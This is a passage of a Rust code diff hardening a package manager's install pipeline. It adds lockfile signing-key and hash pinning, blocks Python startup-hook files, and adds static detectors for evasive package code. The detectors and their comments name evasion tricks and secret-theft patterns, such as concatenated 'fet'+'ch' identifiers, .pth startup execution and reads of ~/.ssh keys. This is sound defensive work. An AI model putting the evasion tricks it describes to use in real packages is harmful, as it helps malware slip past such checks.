@@ -417,6 +417,18 @@ impl DependencySelection {
 #[derive(Debug, Clone, Default, Serialize, Deserialize)]
 pub struct OmcLock {
     pub version: u32,
+    /// F3 trust anchor: the base64 ed25519 PUBLIC key of the project's artifact
+    /// signing key, pinned on first sign. `install --locked`/`ci` require every
+    /// artifact's embedded `signature.public_key` to equal this value, so an
+    /// attacker who re-signs a tampered artifact with their OWN key is rejected.
+    /// Optional + skip-if-empty for back-compat with pre-F3 lockfiles (which are
+    /// then treated as untrusted and must be re-locked).
+    #[serde(
+        default,
+        rename = "signing-key",
+        skip_serializing_if = "Option::is_none"
+    )]
+    pub signing_key: Option<String>,
     #[serde(default)]
     pub packages: Vec<LockedPackage>,
     #[serde(default)]
@@ -429,6 +441,7 @@ impl OmcLock {
     pub fn new() -> Self {
         Self {
             version: 1,
+            signing_key: None,
             packages: Vec::new(),
             local_sources: Vec::new(),
             python_vcs: Vec::new(),
@@ -503,6 +516,18 @@ pub struct LockedPackage {
     pub archive: String,
     pub artifact: String,
     pub sha256: String,
+    /// F3 trust anchor: sha256 of the artifact JSON payload (signature stripped)
+    /// recorded at lock time. `install --locked`/`ci` re-hash the on-disk
+    /// artifact and require it to equal this, so a tampered artifact (even one
+    /// re-signed with the project's own key) is rejected. serde default keeps
+    /// pre-F3 lockfiles parseable (an empty value disables the pin for that
+    /// entry, so old locks must be re-locked to gain the protection).
+    #[serde(
+        default,
+        rename = "artifact-sha256",
+        skip_serializing_if = "String::is_empty"
+    )]
+    pub artifact_sha256: String,
     pub behavior: Behavior,
     pub verdict: Verdict,
     #[serde(default)]
@@ -1153,6 +1178,10 @@ pub fn remove_locked_packages(
     let mut lock = read_lockfile(&lockfile)?;
     let mut removed = Vec::new();
     let mut removed_locked_pypi_names = BTreeSet::new();
+    // F6 hygiene: collect the (ecosystem, name, version) of removed entries so we
+    // can also prune their on-disk artifact + cache directories (the lock edit
+    // alone would orphan `.omc/artifacts/<eco>/<pkg>/` and `.omc/cache/<eco>/<pkg>/`).
+    let mut pruned_artifacts: Vec<(Ecosystem, String, String)> = Vec::new();
     lock.packages.retain(|package| {
         let should_remove = specs
             .iter()
@@ -1161,6 +1190,11 @@ pub fn remove_locked_packages(
             if package.ecosystem == Ecosystem::Pypi {
                 removed_locked_pypi_names.insert(normalize_pypi_name(&package.name));
             }
+            pruned_artifacts.push((
+                package.ecosystem,
+                package.name.clone(),
+                package.version.clone(),
+            ));
             removed.push(locked_package_key(package));
             false
         } else {
@@ -1192,8 +1226,55 @@ pub fn remove_locked_packages(
     if !removed.is_empty() || !removed_vcs.is_empty() {
         fs::write(lockfile, toml::to_string_pretty(&lock)?)?;
     }
+
+    // F6 hygiene: prune orphaned artifact + cache directories for removed
+    // packages, and an emptied node_modules/.bin. Best-effort: failures here must
+    // not fail the uninstall (the lock — the source of truth — is already updated).
+    for (ecosystem, name, version) in &pruned_artifacts {
+        prune_removed_package_artifacts(project_dir, *ecosystem, name, version);
+    }
+    prune_empty_npm_bin_dir(project_dir);
+
     removed.extend(removed_vcs);
     Ok(removed)
+}
+
+/// F6 — remove the artifact + cache directories left behind by an uninstalled
+/// package. Best-effort: removes the version dir and, if it becomes empty, the
+/// package dir. Paths are built from the package coordinates (same scheme as
+/// `artifact_path_for` / `cache_archive`).
+fn prune_removed_package_artifacts(
+    project_dir: &Path,
+    ecosystem: Ecosystem,
+    name: &str,
+    version: &str,
+) {
+    let omc = project_dir.join(".omc");
+    for root in ["artifacts", "cache"] {
+        let package_dir = omc
+            .join(root)
+            .join(ecosystem.to_string())
+            .join(safe_name(name));
+        let version_dir = package_dir.join(version);
+        let _ = remove_path_if_exists(&version_dir);
+        // Remove the now-empty package directory if no other versions remain.
+        if let Ok(mut entries) = fs::read_dir(&package_dir) {
+            if entries.next().is_none() {
+                let _ = fs::remove_dir(&package_dir);
+            }
+        }
+    }
+}
+
+/// F6 — remove `node_modules/.bin` if it is now empty after an uninstall (it is
+/// otherwise left dangling). Best-effort.
+fn prune_empty_npm_bin_dir(project_dir: &Path) {
+    let bin_dir = project_dir.join("node_modules").join(".bin");
+    if let Ok(mut entries) = fs::read_dir(&bin_dir) {
+        if entries.next().is_none() {
+            let _ = fs::remove_dir(&bin_dir);
+        }
+    }
 }
 
 pub fn prune_locked_package_versions(
@@ -1644,6 +1725,7 @@ fn sync_local_source_lockfile(
         return Ok(());
     }
 
+    ensure_lock_signing_key(project_dir, &mut lock)?;
     lock.replace_local_sources(sources);
     fs::write(lockfile, toml::to_string_pretty(&lock)?)?;
     Ok(())
@@ -1680,7 +1762,7 @@ fn validate_locked_local_sources(
                 source.ecosystem, source.name, source.source_path
             )));
         }
-        verify_locked_local_source_artifact(project_dir, locked)?;
+        verify_locked_local_source_artifact(project_dir, locked, lock.signing_key.as_deref())?;
     }
     Ok(())
 }
@@ -1688,10 +1770,24 @@ fn validate_locked_local_sources(
 fn verify_locked_local_source_artifact(
     project_dir: &Path,
     source: &LockedLocalSource,
+    pinned_key: Option<&str>,
 ) -> Result<()> {
     let artifact_path = checked_join(project_dir, Path::new(&source.artifact))?;
     let artifact = serde_json::from_str::<OmcArtifact>(&fs::read_to_string(&artifact_path)?)?;
     verify_artifact_signature(&artifact)?;
+    // F3 trust anchor (local sources): require the project's pinned signing key.
+    // The full field-by-field cross-check below already binds verdict/grants/
+    // capabilities to the lock, so a payload pin is redundant here; the key pin
+    // closes the re-signing gap.
+    if let Some(pinned_key) = pinned_key.filter(|key| !key.is_empty()) {
+        if artifact.signature.as_ref().map(|s| s.public_key.as_str()) != Some(pinned_key) {
+            return Err(OmcRegistryError::UnsupportedInstallArtifact(format!(
+                "local source artifact `{}` for {}:{}@{} is not signed by the project key \
+                 pinned in omc.lock — refusing to trust a re-signed artifact",
+                source.artifact, source.ecosystem, source.name, source.version
+            )));
+        }
+    }
     if artifact.package.ecosystem != source.ecosystem
         || artifact.package.name != source.name
         || artifact.package.version != source.version
@@ -3285,6 +3381,7 @@ fn link_package_inner(
     };
     sign_artifact(&options.project_dir, &mut artifact)?;
     let artifact_path = write_artifact(&options.project_dir, &resolved, &artifact)?;
+    let artifact_sha256 = artifact_payload_sha256(&artifact)?;
 
     let locked = LockedPackage {
         ecosystem: resolved.ecosystem,
@@ -3294,6 +3391,7 @@ fn link_package_inner(
         archive: relative_path(&options.project_dir, &archive_path),
         artifact: relative_path(&options.project_dir, &artifact_path),
         sha256,
+        artifact_sha256,
         behavior,
         verdict,
         dependencies: artifact.dependencies.clone(),
@@ -3322,6 +3420,7 @@ fn link_package_inner(
 
     let lockfile = options.project_dir.join(LOCKFILE);
     let mut lock = read_lockfile(&lockfile)?;
+    ensure_lock_signing_key(&options.project_dir, &mut lock)?;
     lock.upsert(locked.clone());
     fs::write(&lockfile, toml::to_string_pretty(&lock)?)?;
 
@@ -7862,7 +7961,7 @@ fn install_lock_with_python_target(
                 package.ecosystem, package.name, package.version
             )));
         }
-        verify_locked_artifact(project_dir, package)?;
+        verify_locked_artifact(project_dir, package, lock.signing_key.as_deref())?;
 
         match package.ecosystem {
             Ecosystem::Npm => {
@@ -8136,10 +8235,22 @@ fn normalize_archive_rel_path(path: &str) -> String {
     path.trim_start_matches("./").replace('\\', "/")
 }
 
-fn verify_locked_artifact(project_dir: &Path, package: &LockedPackage) -> Result<()> {
+fn verify_locked_artifact(
+    project_dir: &Path,
+    package: &LockedPackage,
+    pinned_key: Option<&str>,
+) -> Result<()> {
     let artifact_path = checked_join(project_dir, Path::new(&package.artifact))?;
     let artifact = serde_json::from_str::<OmcArtifact>(&fs::read_to_string(&artifact_path)?)?;
     verify_artifact_signature(&artifact)?;
+
+    // F3 trust anchor: the artifact must be signed by the PROJECT's pinned key
+    // (not just self-consistently signed by some key) AND its payload hash must
+    // match the value pinned in the lock. This defeats an attacker who tampers a
+    // cached artifact (e.g. Blocked -> Accepted) and re-signs it with their own
+    // key, since both the embedded public key and the payload hash will differ.
+    enforce_artifact_trust_anchor(&artifact, package, pinned_key)?;
+
     if artifact.package.ecosystem != package.ecosystem
         || artifact.package.name != package.name
         || artifact.package.version != package.version
@@ -8152,6 +8263,56 @@ fn verify_locked_artifact(project_dir: &Path, package: &LockedPackage) -> Result
             "artifact `{}` does not match lock entry for {}:{}@{}",
             package.artifact, package.ecosystem, package.name, package.version
         )));
+    }
+    Ok(())
+}
+
+/// F3 — bind a locked artifact to the project's trust anchor: its embedded
+/// signing public key must equal the lock's pinned `signing-key`, and its
+/// payload sha256 must equal the lock entry's `artifact-sha256`. Both anchors
+/// are required; a missing pin (pre-F3 lockfile) is rejected so an untrusted
+/// lock cannot silently bypass the check by simply omitting the fields.
+fn enforce_artifact_trust_anchor(
+    artifact: &OmcArtifact,
+    package: &LockedPackage,
+    pinned_key: Option<&str>,
+) -> Result<()> {
+    let Some(pinned_key) = pinned_key.filter(|key| !key.is_empty()) else {
+        return Err(OmcRegistryError::UnsupportedInstallArtifact(format!(
+            "lockfile has no pinned artifact signing key (`signing-key`); \
+             re-run `omc install` to re-lock and pin the trust anchor before \
+             `--locked`/`ci` for {}:{}@{}",
+            package.ecosystem, package.name, package.version
+        )));
+    };
+
+    let signature = artifact.signature.as_ref().ok_or_else(|| {
+        OmcRegistryError::UnsupportedInstallArtifact("artifact is unsigned".to_owned())
+    })?;
+    if signature.public_key != pinned_key {
+        return Err(OmcRegistryError::UnsupportedInstallArtifact(format!(
+            "artifact `{}` for {}:{}@{} is signed by an unpinned key `{}` (expected the \
+             project key pinned in omc.lock) — refusing to trust a re-signed artifact",
+            package.artifact, package.ecosystem, package.name, package.version, signature.key_id
+        )));
+    }
+
+    if package.artifact_sha256.is_empty() {
+        return Err(OmcRegistryError::UnsupportedInstallArtifact(format!(
+            "lock entry for {}:{}@{} has no pinned `artifact-sha256`; re-lock to pin it",
+            package.ecosystem, package.name, package.version
+        )));
+    }
+    let actual = artifact_payload_sha256(artifact)?;
+    if !actual.eq_ignore_ascii_case(&package.artifact_sha256) {
+        return Err(OmcRegistryError::DigestMismatch {
+            name: format!(
+                "{}:{}@{} artifact",
+                package.ecosystem, package.name, package.version
+            ),
+            expected: format!("sha256:{}", package.artifact_sha256),
+            actual: format!("sha256:{actual}"),
+        });
     }
     Ok(())
 }
@@ -8589,6 +8750,11 @@ fn install_pypi_wheel_package(
     for index in 0..archive.len() {
         let mut file = archive.by_index(index)?;
         let archive_path = Path::new(file.name());
+        // F5: drop Python startup hooks (.pth / sitecustomize / usercustomize)
+        // from the wheel so they cannot execute at interpreter startup.
+        if is_python_startup_hook_path(archive_path) {
+            continue;
+        }
         if !overwrite_existing && wheel_path_has_existing_target(archive_path, &existing_top_level)
         {
             continue;
@@ -8914,6 +9080,12 @@ fn is_python_metadata_dir(name: &str) -> bool {
 }
 
 fn should_copy_python_sdist_path(path: &Path) -> bool {
+    // F5: never land Python startup-hook files in site-packages. `.pth` files
+    // execute any `import ...` line at interpreter startup, and sitecustomize/
+    // usercustomize run automatically — all amount to CPython startup RCE.
+    if is_python_startup_hook_path(path) {
+        return false;
+    }
     let mut components = path.components();
     let Some(first) = components
         .next()
@@ -8933,6 +9105,20 @@ fn should_copy_python_sdist_path(path: &Path) -> bool {
         return false;
     }
     true
+}
+
+/// F5 — true for Python interpreter startup hooks that must never be installed
+/// into site-packages: any `*.pth` file (lines are executed at startup) and
+/// `sitecustomize.py` / `usercustomize.py` (auto-imported by CPython at start).
+fn is_python_startup_hook_path(path: &Path) -> bool {
+    let Some(name) = path
+        .file_name()
+        .and_then(|name| name.to_str())
+        .map(str::to_ascii_lowercase)
+    else {
+        return false;
+    };
+    name.ends_with(".pth") || matches!(name.as_str(), "sitecustomize.py" | "usercustomize.py")
 }
 
 fn is_ignorable_archive_metadata_path(path: &str) -> bool {
@@ -17145,6 +17331,35 @@ fn sign_artifact(project_dir: &Path, artifact: &mut OmcArtifact) -> Result<()> {
     Ok(())
 }
 
+/// Pin the project's artifact signing public key into the lock if not already
+/// set (F3). Idempotent: once pinned, the value is left untouched so a later
+/// run cannot silently rotate the trust anchor without an explicit re-lock.
+fn ensure_lock_signing_key(project_dir: &Path, lock: &mut OmcLock) -> Result<()> {
+    if lock.signing_key.as_deref().is_none_or(str::is_empty) {
+        lock.signing_key = Some(project_signing_public_key(project_dir)?);
+    }
+    Ok(())
+}
+
+/// Base64 ed25519 PUBLIC key of the project's artifact signing key. This is the
+/// F3 trust anchor pinned into `omc.lock` on first sign. Reading the signing key
+/// creates it on first call (mirrors `sign_artifact`), so the pinned key always
+/// matches the key that signs the artifacts written in the same run.
+fn project_signing_public_key(project_dir: &Path) -> Result<String> {
+    let signing_key = read_or_create_artifact_signing_key(project_dir)?;
+    Ok(STANDARD.encode(signing_key.verifying_key().to_bytes()))
+}
+
+/// sha256 of the artifact's canonical JSON payload with the signature stripped.
+/// This is the value pinned into the lock (`LockedPackage::artifact_sha256`) and
+/// re-checked at locked-install time so a tampered artifact cannot be trusted
+/// even if re-signed with the project's own key.
+fn artifact_payload_sha256(artifact: &OmcArtifact) -> Result<String> {
+    let mut unsigned = artifact.clone();
+    unsigned.signature = None;
+    Ok(sha256_hex(&serde_json::to_vec(&unsigned)?))
+}
+
 pub fn verify_artifact_signature(artifact: &OmcArtifact) -> Result<()> {
     let signature = artifact.signature.as_ref().ok_or_else(|| {
         OmcRegistryError::UnsupportedInstallArtifact("artifact is unsigned".to_owned())
@@ -17566,14 +17781,17 @@ impl SourceProfiler {
             }
         }
 
-        for pattern in [
-            "readfilesync",
-            "readfile(",
-            "createreadstream",
-            "require(\"fs\")",
-            "require('fs')",
-            "open(",
-        ] {
+        // F4: capture the concrete LITERAL read path when present so the verdict
+        // gate can run `is_sensitive_read_path` against it (reading ~/.ssh/.env/
+        // keys is denied even under fs.read:* / --allow-all-host, mirroring the
+        // in-cell guarantee). A genuinely dynamic read path (no literal arg) is
+        // opaque, so it falls back to "*" AND trips F1's fail-closed below.
+        for marker in ["readfilesync", "readfile", "createreadstream", "open"] {
+            for target in fs_read_call_targets(content, marker) {
+                self.add(CapabilityKind::FsRead, target, path, marker);
+            }
+        }
+        for pattern in ["require(\"fs\")", "require('fs')"] {
             if lower.contains(pattern) {
                 self.add(CapabilityKind::FsRead, "*", path, pattern);
             }
@@ -17619,6 +17837,15 @@ impl SourceProfiler {
 
         if contains_dynamic_eval(content) {
             self.add(CapabilityKind::DynamicEval, "*", path, "dynamic eval");
+        }
+
+        // F1 fail-closed: opaque/dynamic access to a capability ROOT means we
+        // cannot statically see what the package does. Emit a DynamicEval
+        // capability so the verdict gate denies-by-default (mirrors the in-cell
+        // path). Scoped to dangerous roots only so ordinary computed access on
+        // local objects/arrays (obj[key], arr[i]) and literal fs reads stay Pure.
+        for evidence in detect_opaque_capability_access(content) {
+            self.add(CapabilityKind::DynamicEval, "*", path, evidence);
         }
     }
 
@@ -17754,6 +17981,52 @@ fn parse_quoted_literal(content: &str) -> Option<(String, usize)> {
         literal.push(*byte);
     }
     None
+}
+
+/// F4 — find file-read call sites for `<marker>(` and return their read
+/// targets. When the first call argument is a string LITERAL, the concrete path
+/// is returned so the verdict gate can run `is_sensitive_read_path` against it
+/// (e.g. reading `~/.ssh/id_rsa` is blocked even under `fs.read:*`). When the
+/// path is dynamic (a variable/expression), we fall back to "*": this preserves
+/// the prior accept-under-grant behavior for ordinary packages that read
+/// computed project paths, and does NOT fail closed (that is reserved for
+/// dynamic access to capability ROOTS in `detect_opaque_capability_access`).
+fn fs_read_call_targets(content: &str, marker: &str) -> BTreeSet<String> {
+    let lower = content.to_ascii_lowercase();
+    let mut targets = BTreeSet::new();
+    let mut offset = 0;
+    while let Some(index) = lower[offset..].find(marker) {
+        let start = offset + index;
+        let after = start + marker.len();
+        // The marker must start a real identifier OR be a member method name
+        // (`fs.readFileSync(`): allow a preceding `.` so member calls match, but
+        // reject a preceding identifier char (so `myReadFile` does not match
+        // `readfile`). The char after the marker must not continue an identifier.
+        let preceded_ok = lower[..start]
+            .chars()
+            .next_back()
+            .is_none_or(|ch| !is_identifier_char(ch));
+        let followed_ok = lower[after..]
+            .chars()
+            .next()
+            .is_none_or(|ch| !is_identifier_char(ch));
+        if preceded_ok && followed_ok {
+            let rest = content[after..].trim_start();
+            if let Some(args) = rest.strip_prefix('(') {
+                match parse_quoted_literal(args.trim_start()) {
+                    Some((literal, _)) if !literal.is_empty() => {
+                        targets.insert(literal);
+                    }
+                    _ => {
+                        // Dynamic path: opaque target, accept-under-grant only.
+                        targets.insert("*".to_owned());
+                    }
+                }
+            }
+        }
+        offset = after;
+    }
+    targets
 }
 
 fn contains_python_file_write(content: &str) -> bool {
@@ -17928,6 +18201,278 @@ fn contains_dynamic_eval(content: &str) -> bool {
         || contains_new_function(&lower)
 }
 
+/// Capability roots whose name, if reached through opaque/dynamic access,
+/// hands the package the full host surface. Computed/bracket access or
+/// string-concatenated references to ANY of these means the profiler cannot
+/// statically see the behavior, so we must fail closed (F1). Ordinary local
+/// objects/arrays are NOT in this set, so `obj[key]` / `arr[i]` stay Pure.
+const JS_CAPABILITY_ROOTS: &[&str] = &[
+    "process",
+    "require",
+    "module",
+    "globalthis",
+    "global",
+    "reflect",
+    "child_process",
+    "fetch",
+    "eval",
+];
+
+const PY_CAPABILITY_ROOTS: &[&str] = &[
+    "os",
+    "sys",
+    "subprocess",
+    "builtins",
+    "__builtins__",
+    "importlib",
+    "socket",
+];
+
+/// F1 — detect "I cannot statically see what this does" indicators that resolve
+/// to a capability root, and return human-readable evidence strings. Each
+/// returned evidence becomes a DynamicEval capability so the verdict gate fails
+/// closed. Deliberately narrow: only dynamism aimed at the dangerous roots
+/// (or at fetch/eval/Function) trips this; plain computed access on local data
+/// does not.
+fn detect_opaque_capability_access(content: &str) -> BTreeSet<String> {
+    let mut evidence = BTreeSet::new();
+    let lower = content.to_ascii_lowercase();
+
+    // --- JavaScript / TypeScript --------------------------------------------
+
+    // Computed/bracket access on a dangerous root: process[...], globalThis[...],
+    // require[...], Reflect[...], fs[...], child_process[...], module[...].
+    for root in JS_CAPABILITY_ROOTS {
+        if js_has_computed_access_on(&lower, root) {
+            evidence.insert(format!(
+                "opaque/dynamic access to capability root `{root}[...]` — cannot verify"
+            ));
+        }
+    }
+
+    // dynamic import(): `import(` used as a call (not `import x from`).
+    if js_has_dynamic_import(&lower) {
+        evidence.insert(
+            "opaque/dynamic `import(...)` — cannot verify dynamically imported module".to_owned(),
+        );
+    }
+
+    // `new Function(` constructor — builds code at runtime. (Bare anonymous
+    // `function(` declarations are ordinary and must NOT trip this; only the
+    // constructor form via `new Function` or a concat-built `Function` does.)
+    if contains_new_function(&lower) {
+        evidence.insert("`new Function(...)` builds code at runtime — cannot verify".to_owned());
+    }
+
+    // Indirect require: `const r = require; r(...)` (alias then call).
+    if js_has_indirect_require(&lower) {
+        evidence.insert("indirect `require` via alias — cannot verify required module".to_owned());
+    }
+
+    // Identifier/member name built by string concatenation that resolves to a
+    // dangerous root or to fetch/eval/Function (e.g. 'en'+'v', 'fet'+'ch').
+    for fragment in concatenation_built_capability_fragments(content) {
+        evidence.insert(format!(
+            "capability identifier `{fragment}` assembled from string fragments — cannot verify"
+        ));
+    }
+
+    // --- Python --------------------------------------------------------------
+
+    // `getattr` is ubiquitous and benign in ordinary Python (`getattr(self, x)`),
+    // so we only fail closed when its FIRST argument is a capability root
+    // (`getattr(os, ...)`, `getattr(__import__('os'), ...)`, `getattr(builtins, ...)`).
+    if py_getattr_on_capability_root(&lower) {
+        evidence.insert(
+            "opaque `getattr(...)` on a capability root — cannot verify dynamic attribute"
+                .to_owned(),
+        );
+    }
+    if contains_standalone_call(&lower, "__import__") {
+        evidence.insert("opaque `__import__(...)` dynamic import — cannot verify".to_owned());
+    }
+    if py_uses_importlib_dynamic_import(&lower) {
+        evidence.insert("opaque `importlib` dynamic import — cannot verify".to_owned());
+    }
+    if contains_standalone_call(&lower, "compile") {
+        evidence.insert("`compile(...)` builds code objects at runtime — cannot verify".to_owned());
+    }
+    if lower.contains("globals()[") || lower.contains("locals()[") {
+        evidence
+            .insert("opaque `globals()`/`locals()` subscript access — cannot verify".to_owned());
+    }
+    if lower.contains("__builtins__") {
+        evidence.insert(
+            "reference to `__builtins__` — opaque access to builtins, cannot verify".to_owned(),
+        );
+    }
+    // Reflection-style subscript on a dangerous root (e.g. `os.__dict__[...]`).
+    for root in PY_CAPABILITY_ROOTS {
+        if py_has_computed_access_on(&lower, root) {
+            evidence.insert(format!(
+                "opaque dynamic access to capability root `{root}.__dict__[...]` — cannot verify"
+            ));
+        }
+    }
+
+    evidence
+}
+
+/// True if `getattr(` is called with a capability root as its first argument:
+/// `getattr(os, ...)`, `getattr(sys, ...)`, `getattr(subprocess, ...)`, etc.
+/// Plain `getattr(self, name)` / `getattr(obj, k)` does NOT trip this.
+fn py_getattr_on_capability_root(lower: &str) -> bool {
+    let mut offset = 0;
+    while let Some(index) = lower[offset..].find("getattr") {
+        let start = offset + index;
+        let after = start + "getattr".len();
+        if is_identifier_boundary(lower, start) {
+            let rest = lower[after..].trim_start();
+            if let Some(args) = rest.strip_prefix('(') {
+                let first_arg = args.trim_start();
+                for root in PY_CAPABILITY_ROOTS {
+                    if first_arg.starts_with(root) {
+                        let next = first_arg[root.len()..].chars().next();
+                        if next.is_none_or(|ch| !is_identifier_char(ch)) {
+                            return true;
+                        }
+                    }
+                }
+                // getattr(__import__(...), ...) is opaque regardless of the
+                // imported module name.
+                if first_arg.starts_with("__import__") {
+                    return true;
+                }
+            }
+        }
+        offset = after;
+    }
+    false
+}
+
+/// True if importlib is used to import a module dynamically (`import_module`,
+/// `__import__`, `SourceFileLoader`, `util.module_from_spec`). A bare
+/// `import importlib.metadata` for reading package metadata is not flagged.
+fn py_uses_importlib_dynamic_import(lower: &str) -> bool {
+    lower.contains("importlib.import_module")
+        || lower.contains("importlib.__import__")
+        || lower.contains("import_module(")
+        || lower.contains("module_from_spec")
+        || lower.contains("sourcefileloader")
+        || lower.contains("spec_from_file_location")
+}
+
+/// True if `content` (lowercased) contains `<root>[` where `root` stands as a
+/// real identifier (not part of a longer name / not preceded by `.`). The `[`
+/// may be separated by whitespace.
+fn js_has_computed_access_on(lower: &str, root: &str) -> bool {
+    let mut offset = 0;
+    while let Some(index) = lower[offset..].find(root) {
+        let start = offset + index;
+        let after = start + root.len();
+        if is_identifier_boundary(lower, start)
+            && lower[after..]
+                .chars()
+                .next()
+                .is_none_or(|ch| !is_identifier_char(ch))
+            && lower[after..].trim_start().starts_with('[')
+        {
+            return true;
+        }
+        offset = after;
+    }
+    false
+}
+
+/// Python opaque subscript on a dangerous root, e.g. `sys.modules[` /
+/// `os.environ[` are normal (handled elsewhere); here we flag direct dynamic
+/// subscripting that resolves a capability root by computed key only when the
+/// key is non-literal. To stay simple and avoid over-blocking, we only flag
+/// `__dict__[` style reflection on these roots.
+fn py_has_computed_access_on(lower: &str, root: &str) -> bool {
+    let needle = format!("{root}.__dict__[");
+    lower.contains(&needle)
+}
+
+/// dynamic `import(` call form. Excludes static `import x from 'y'` and
+/// `import 'side-effect'` (those have no `(` directly after `import`).
+fn js_has_dynamic_import(lower: &str) -> bool {
+    contains_standalone_call(lower, "import")
+}
+
+/// Detect `alias = require;` (require assigned without an immediate call), which
+/// later lets the package call the alias to load arbitrary modules opaquely.
+fn js_has_indirect_require(lower: &str) -> bool {
+    let mut offset = 0;
+    while let Some(index) = lower[offset..].find("require") {
+        let start = offset + index;
+        let after = start + "require".len();
+        if is_identifier_boundary(lower, start) {
+            let rest = lower[after..].trim_start();
+            // `require` followed by anything that is NOT a call `(` and NOT a
+            // member access `.`/`[` and NOT another identifier char → it is
+            // being used as a value (aliased / passed), which is opaque.
+            let next = rest.chars().next();
+            let used_as_value = matches!(next, Some(';') | Some(',') | Some(')'))
+                || rest.starts_with("=>")
+                || (rest.starts_with('=') && !rest.starts_with("=="));
+            if used_as_value {
+                return true;
+            }
+        }
+        offset = after;
+    }
+    false
+}
+
+/// Find capability identifiers assembled from adjacent quoted string fragments
+/// joined by `+`, e.g. `'en'+'v'`, `'fet' + 'ch'`, `'glob'+'alThis'`. We
+/// concatenate runs of `"..." +`/`'...' +` literals and, if the joined result
+/// (lowercased) equals or contains a capability root / fetch / eval / function,
+/// report it. This catches `process['en'+'v']`, `globalThis['fet'+'ch']`, etc.
+fn concatenation_built_capability_fragments(content: &str) -> BTreeSet<String> {
+    let mut found = BTreeSet::new();
+    let bytes = content.as_bytes();
+    let mut index = 0;
+    while index < bytes.len() {
+        if matches!(bytes[index], b'\'' | b'"' | b'`') {
+            if let Some((first, consumed)) = parse_quoted_literal(&content[index..]) {
+                // Begin a concatenation run.
+                let mut joined = first;
+                let mut cursor = index + consumed;
+                let mut pieces = 1;
+                loop {
+                    let rest = content[cursor..].trim_start();
+                    let advanced = content[cursor..].len() - rest.len();
+                    if let Some(after_plus) = rest.strip_prefix('+') {
+                        let next = after_plus.trim_start();
+                        let next_advanced = after_plus.len() - next.len();
+                        if let Some((piece, piece_consumed)) = parse_quoted_literal(next) {
+                            joined.push_str(&piece);
+                            pieces += 1;
+                            cursor = cursor + advanced + 1 + next_advanced + piece_consumed;
+                            continue;
+                        }
+                    }
+                    break;
+                }
+                if pieces >= 2 {
+                    let lowered = joined.to_ascii_lowercase();
+                    if JS_CAPABILITY_ROOTS.iter().any(|root| lowered == *root)
+                        || matches!(lowered.as_str(), "fetch" | "eval" | "function" | "env")
+                    {
+                        found.insert(joined);
+                    }
+                }
+                index += consumed;
+                continue;
+            }
+        }
+        index += 1;
+    }
+    found
+}
+
 fn contains_new_function(lower: &str) -> bool {
     let mut offset = 0;
     while let Some(index) = lower[offset..].find("new") {
@@ -17997,39 +18542,50 @@ fn module_from_profile(package: &ResolvedPackage, capabilities: &[CapabilityFind
     } else {
         BehaviorType::HostCapability
     };
+    // F2: model a tainted DATA FLOW from EVERY sensitive source (env/file read)
+    // to EVERY sink (network, process spawn, fs write, dynamic eval) so the
+    // verifier's `check_flows` evaluates each source->sink pair. Previously only
+    // the env-read x http pairing was wired (`body_from_stack`), so fs-read->net,
+    // env->proc, env->eval and env->fs-write were silently Accepted at install
+    // time even though the identical env->http pattern was Blocked. We emit, for
+    // each (source, sink) pair, a self-contained `push source; consume in sink`
+    // sequence; the sink's *_from_stack flag makes the verifier pop the tainted
+    // label and run the flow check, requiring a covering flow grant to pass.
     let mut code = Vec::new();
-    let env_findings = capabilities
-        .iter()
-        .filter(|finding| finding.kind == CapabilityKind::EnvRead)
-        .collect::<Vec<_>>();
-    let http_findings = capabilities
-        .iter()
-        .filter(|finding| finding.kind == CapabilityKind::HttpRequest)
-        .collect::<Vec<_>>();
+    let is_source = |finding: &&CapabilityFinding| {
+        matches!(
+            finding.kind,
+            CapabilityKind::EnvRead | CapabilityKind::FsRead
+        )
+    };
+    let is_sink = |finding: &&CapabilityFinding| {
+        matches!(
+            finding.kind,
+            CapabilityKind::HttpRequest
+                | CapabilityKind::ProcSpawn
+                | CapabilityKind::FsWrite
+                | CapabilityKind::DynamicEval
+        )
+    };
+    let sources = capabilities.iter().filter(is_source).collect::<Vec<_>>();
+    let sinks = capabilities.iter().filter(is_sink).collect::<Vec<_>>();
 
-    if env_findings.is_empty() || http_findings.is_empty() {
+    if sources.is_empty() || sinks.is_empty() {
+        // No source->sink edge to model; emit each capability once so the
+        // per-capability grant check (and the F1 DynamicEval deny) still runs.
         for finding in &capabilities {
             code.push(Op::Cap(cap_op_from_finding(finding)));
         }
     } else {
-        for env in &env_findings {
-            for http in &http_findings {
-                code.push(Op::Cap(cap_op_from_finding(env)));
-                let mut cap = cap_op_from_finding(http);
-                if let CapOp::HttpRequest { request } = &mut cap {
-                    request.body_from_stack = true;
-                }
-                code.push(Op::Cap(cap));
+        for source in &sources {
+            for sink in &sinks {
+                code.push(Op::Cap(cap_op_from_finding(source)));
+                code.push(Op::Cap(sink_cap_op_consuming_stack(sink)));
             }
         }
-        for finding in capabilities.iter().filter(|finding| {
-            !matches!(
-                finding.kind,
-                CapabilityKind::EnvRead | CapabilityKind::HttpRequest
-            )
-        }) {
-            code.push(Op::Cap(cap_op_from_finding(finding)));
-        }
+        // Emit sources/sinks once more standalone is unnecessary: every source
+        // and every sink already appears in at least one pair above, so their
+        // capability grant is checked. Nothing else to add.
     }
     code.push(Op::Const(Value::Unit));
     code.push(Op::Return);
@@ -18082,6 +18638,37 @@ fn cap_op_from_finding(finding: &CapabilityFinding) -> CapOp {
         CapabilityKind::DynamicEval => CapOp::DynamicEval {
             source_from_stack: false,
         },
+    }
+}
+
+/// Build the sink CapOp for a finding with its from-stack flag set, so the
+/// verifier pops the tainted source label pushed immediately before it and runs
+/// `check_flows` for the source->sink pair (F2). Non-sink findings fall back to
+/// the plain op.
+fn sink_cap_op_consuming_stack(finding: &CapabilityFinding) -> CapOp {
+    match finding.kind {
+        CapabilityKind::HttpRequest => CapOp::HttpRequest {
+            request: HttpRequest {
+                method: "POST".to_owned(),
+                url: "omc://observed-network".to_owned(),
+                host: finding.target.clone(),
+                body_from_stack: true,
+            },
+        },
+        CapabilityKind::ProcSpawn => CapOp::ProcSpawn {
+            command: finding.target.clone(),
+            args: Vec::new(),
+            args_from_stack: 1,
+        },
+        CapabilityKind::FsWrite => CapOp::FsWrite {
+            path: VirtualPath(finding.target.clone()),
+            value_from_stack: true,
+        },
+        CapabilityKind::DynamicEval => CapOp::DynamicEval {
+            source_from_stack: true,
+        },
+        // Not a sink: emit the plain op (no stack consumption).
+        CapabilityKind::EnvRead | CapabilityKind::FsRead => cap_op_from_finding(finding),
     }
 }
 
@@ -18881,6 +19468,184 @@ struct PypiFile {
 #[derive(Debug, Deserialize)]
 struct PypiDigests {
     sha256: String,
+}
+
+#[cfg(test)]
